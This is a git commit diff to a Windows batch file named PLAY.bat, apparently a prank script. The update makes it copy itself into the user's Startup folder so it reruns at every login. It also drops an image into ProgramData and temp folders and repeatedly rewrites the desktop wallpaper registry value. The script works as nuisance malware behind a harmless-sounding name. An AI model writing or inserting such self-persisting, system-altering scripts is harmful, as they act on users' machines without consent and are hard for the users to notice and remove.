37b23295670ec8c2a23368235b60772c85a0f576
madzucker <108788682+madzucker@users.noreply.github.com>
2022-07-11 09:23:51 +0700

    Update PLAY.bat

--- PLAY.bat
+++ PLAY.bat
@@ -1,2 +1,7 @@
-copy bgbob.jpg C:\ProgramData\bgbob.jpg
-reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d C:\ProgramData\bgbob.jpg /f
+copy play.bat "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+copy wlpprr.jpg C:\ProgramData\
+copy wlpprr.jpg C:\Windows\Temp
+copy wlpprr.jpg %userprofile%\AppData\Local\Temp\
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d C:\ProgramData\wlpprr.jpg /f
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d C:\Windows\Temp\wlpprr.jpg /f
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%userprofile%\AppData\Local\Temp\wlpprr.jpg" /f
